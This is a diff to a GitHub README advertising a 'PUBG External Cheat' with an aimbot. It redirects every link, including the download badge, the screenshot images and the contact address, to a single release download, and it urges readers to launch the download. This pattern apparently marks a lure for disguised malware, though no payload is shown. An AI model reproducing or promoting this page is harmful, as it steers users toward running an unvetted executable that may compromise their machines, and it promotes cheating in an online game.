@@ -12,7 +12,7 @@ Welcome to the official repository of **PUBG External Cheat FULL Feature**! Here
 
 To access the source code and start utilizing the powerful features of this PUBG External Cheat, you can download the code by clicking the button below:
 
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Source Code](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0%20Code-blue)](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0)
 
 *Please note that the download needs to be launched.*
 
@@ -32,10 +32,10 @@ Explore a wide range of features included in this PUBG External Cheat:
 
 Here are some screenshots showcasing the features and interface of the PUBG External Cheat:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0)
 *Screenshot 1: Aimbot in action*
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0)
 *Screenshot 2: Cheat Menu options*
 
 ## 📥 Installation Guide 📦
@@ -53,7 +53,7 @@ Contributions to this repository are welcome! If you have any ideas for enhancem
 
 ## 📞 Contact Us 📧
 
-Have any questions or suggestions regarding the PUBG External Cheat? Reach out to us at [pubgcheat@example.com](mailto:pubgcheat@example.com) or visit our [GitHub repository](https://github.com/PUBG-External-Cheat-FULL-Feature) for more information.
+Have any questions or suggestions regarding the PUBG External Cheat? Reach out to us at [https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0) or visit our [GitHub repository](https://github.com/n00b10221/PUBG-External-Cheat-FULL-Feature/releases/tag/v1.0) for more information.
 
 ## 📢 Enjoy Gaming 🎮
 
